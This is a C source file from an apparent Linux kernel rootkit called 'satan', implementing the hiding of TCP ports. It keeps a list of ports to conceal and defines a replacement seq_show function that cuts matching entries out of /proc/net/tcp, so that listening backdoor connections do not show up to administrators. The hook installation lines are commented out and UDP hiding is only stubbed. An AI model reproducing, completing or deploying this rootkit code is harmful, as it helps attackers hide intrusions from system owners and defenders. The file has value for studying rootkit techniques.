// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "port.h"

#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <net/tcp.h>


#define PORT_NUM_HEX_STR_LEN 8
#define TMPSZ 150

#define PORT_MIN 1
#define PORT_MAX 65535

#define RETURN_IF_PORT_INVALID(port_num)                              \
        if (port_num < PORT_MIN || port_num > PORT_MAX) {             \
                pr_alert("satan: port: invalid port %d\n", port_num); \
                return 1;                                             \
        }


static int satan_port_hook_seq_show(void);
static int satan_port_unhook_seq_show(void);


/* User's hidden ports are recorded in a list. */
struct hidden_port {
        unsigned int port_num;
        char port_num_hex_str[PORT_NUM_HEX_STR_LEN];
        struct list_head list;
};
static LIST_HEAD(hidden_ports_list);  // list of hidden ports.

static struct hidden_port *hidden_ports_list_get(unsigned int port_num);
static int hidden_ports_list_add(unsigned int port_num);
static int hidden_ports_list_del(unsigned int port_num);
static void hidden_ports_list_clear(void);


static int (*real_seq_show)(struct seq_file *, void *) = NULL;
static int satan_seq_show(struct seq_file *seq, void *v);



int satan_port_init(void)
{
        return satan_port_hook_seq_show();
}

void satan_port_exit(void)
{
        satan_port_unhook_seq_show();
        hidden_ports_list_clear();
}


/**
 * satan_port_hide() - Hides a TCP and UDP port.
 * @path: the port number.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_port_hide(unsigned int port_num)
{
        int ret = 0;

        RETURN_IF_PORT_INVALID(port_num);
        ret += satan_port_tcp_hide(port_num);
        ret += satan_port_udp_hide(port_num);
        return ret;
}

/**
 * satan_port_unhide() - Unhides a TCP and UDP port.
 * @path: the port number.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_port_unhide(unsigned int port_num)
{
        int ret = 0;

        RETURN_IF_PORT_INVALID(port_num);
        ret += satan_port_tcp_unhide(port_num);
        ret += satan_port_udp_unhide(port_num);
        return ret;
}


/**
 * satan_port_tcp_hide() - Hides a TCP port.
 * @path: the port number.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_port_tcp_hide(unsigned int port_num)
{
        RETURN_IF_PORT_INVALID(port_num);
        return hidden_ports_list_add(port_num);
}

/**
 * satan_port_tcp_unhide() - Unhides a TCP port.
 * @path: the port number.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_port_tcp_unhide(unsigned int port_num)
{
        RETURN_IF_PORT_INVALID(port_num);
        return hidden_ports_list_del(port_num);
}

/**
 * satan_port_udp_hide() - Hides a UDP port.
 * @path: the port number.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_port_udp_hide(unsigned int port_num)
{
        RETURN_IF_PORT_INVALID(port_num);

        // Not implemented yet.
        return 0;
}

/**
 * satan_port_udp_unhide() - Unhides a UDP port.
 * @path: the port number.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_port_udp_unhide(unsigned int port_num)
{
        RETURN_IF_PORT_INVALID(port_num);

        // Not implemented yet.
        return 0;
}



static struct hidden_port *hidden_ports_list_get(unsigned int port_num)
{
        // Uninitialized for the sake of performance.
        struct hidden_port *p;
        struct list_head *ptr;

        list_for_each(ptr, &hidden_ports_list) {
                p = list_entry(ptr, struct hidden_port, list);

                if (p->port_num == port_num) {
                        return p;
                }
        }

        return NULL;
}

static int hidden_ports_list_add(unsigned int port_num)
{
        struct hidden_port *p = hidden_ports_list_get(port_num);

        if (p) {
                pr_alert("satan: port: %d is already hidden.\n", port_num);
                return 1;
        }


        p = (struct hidden_port *) kmalloc(sizeof(struct hidden_port), GFP_KERNEL);
        p->port_num = port_num;
        snprintf(p->port_num_hex_str, PORT_NUM_HEX_STR_LEN, ":%04X", port_num);

        pr_info("satan: port: adding %d to list of hidden ports\n", port_num);
        list_add_tail(&(p->list), &hidden_ports_list);
        return 0;
}

static int hidden_ports_list_del(unsigned int port_num)
{
        struct hidden_port *p = hidden_ports_list_get(port_num);

        if (!p) {
                pr_info("satan: port: %d has not been hidden.\n", port_num);
                return 1;
        }


        pr_info("satan: port: removing %d from list of hidden ports.\n", port_num);
        list_del(&(p->list));
        kfree(p);
        return 0;
}

static void hidden_ports_list_clear(void)
{
        struct hidden_port *p = NULL;
        struct list_head *ptr = NULL;
        struct list_head *tmp = NULL;

        list_for_each_safe(ptr, tmp, &hidden_ports_list) {
                p = list_entry(ptr, struct hidden_port, list);

                pr_info("satan: port: removing %d from list of hidden ports.\n", p->port_num);
                list_del(ptr);
                kfree(p);
        }
}



static int satan_port_hook_seq_show(void)
{
        int ret = 0;
        struct file *filp = NULL;
        struct tcp_seq_afinfo *afinfo = NULL;


        filp = filp_open("/proc/net/tcp", O_RDONLY, 0);

        if (IS_ERR(filp)) {
            pr_alert("Failed to open /proc/net/tcp\n");
            ret = 1;
            goto out;
        }

        afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
        //real_seq_show = afinfo->seq_ops.show;
        //afinfo->seq_ops.show = satan_seq_show;

out:
        if (filp)
                filp_close(filp, 0);

        return ret;
}

static int satan_port_unhook_seq_show(void)
{
        int ret = 0;
        struct file *filp = NULL;
        struct tcp_seq_afinfo *afinfo = NULL;


        filp = filp_open("/proc/net/tcp", O_RDONLY, 0);

        if (IS_ERR(filp)) {
            pr_alert("Failed to open /proc/net/tcp\n");
            ret = 1;
            goto out;
        }

        afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
        //afinfo->seq_ops.show = real_seq_show;
        //real_seq_show = NULL;

out:
        if (filp)
                filp_close(filp, 0);

        return ret;
}


static int satan_seq_show(struct seq_file *seq, void *v)
{
        // Uninitialized for the sake of performance.
        int ret;
        struct hidden_port *p;
        struct list_head *ptr;
        

        ret = real_seq_show(seq, v);

        list_for_each(ptr, &hidden_ports_list) {
                p = list_entry(ptr, struct hidden_port, list);

                if (strnstr(seq->buf + seq->count - TMPSZ, p->port_num_hex_str, TMPSZ)) {
                        pr_alert("satan: port: hiding tcp port %d.\n", p->port_num);
                        seq->count -= TMPSZ;
                        break;
                }
        }

        return ret;
}
